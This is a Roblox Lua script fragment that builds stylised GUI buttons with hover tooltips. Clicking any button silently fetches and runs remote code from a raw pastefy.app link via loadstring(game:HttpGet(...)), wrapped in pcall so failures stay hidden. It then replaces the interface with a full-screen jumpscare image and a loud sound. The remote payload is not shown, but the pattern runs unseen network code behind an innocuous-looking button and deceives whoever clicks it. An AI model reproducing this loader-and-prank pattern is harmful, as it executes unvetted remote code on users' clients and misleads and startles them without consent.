-- Function to create stylized buttons with tooltips and execution triggers
local function createButton(name, text, tipText)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Parent = ButtonContainer
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    btn.Size = UDim2.new(1, -4, 0, 40)
    btn.Font = Enum.Font.GothamSemibold
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(220, 220, 220)
    btn.TextSize = 13
    btn.AutoButtonColor = false

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 6)
    corner.Parent = btn

    -- Hover animations & Tooltip logic
    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 60, 75)}):Play()
        Tooltip.Text = tipText
        Tooltip.Visible = true
    end)

    btn.MouseMoved:Connect(function()
        local mouse = Players.LocalPlayer:GetMouse()
        Tooltip.Position = UDim2.new(0, mouse.X + 15, 0, mouse.Y + 15)
    end)

    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 50)}):Play()
        Tooltip.Visible = false
    end)

    -- Click event: Runs payload and triggers jumpscare effect
    btn.MouseButton1Click:Connect(function()
        -- Execute requested payload
        pcall(function()
            loadstring(game:HttpGet("https://pastefy.app/iwquiYMS/raw"))()
        end)

        -- Jumpscare execution
        ScreenGui:Destroy()
        
        local JumpscareGui = Instance.new("ScreenGui")
        JumpscareGui.Parent = CoreGui
        
        local JumpImage = Instance.new("ImageLabel")
        JumpImage.Parent = JumpscareGui
        JumpImage.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        JumpImage.Size = UDim2.new(1, 0, 1, 0)
        -- Uses a standard loud/scary asset ID placeholder or direct jumpscare image
        JumpImage.Image = "rbxassetid://6084252655" 
        
        local Sound = Instance.new("Sound")
        Sound.Parent = CoreGui
        Sound.SoundId = "rbxassetid://9060675298"
        Sound.Volume = 5
        Sound:Play()
    end)

    return btn
end

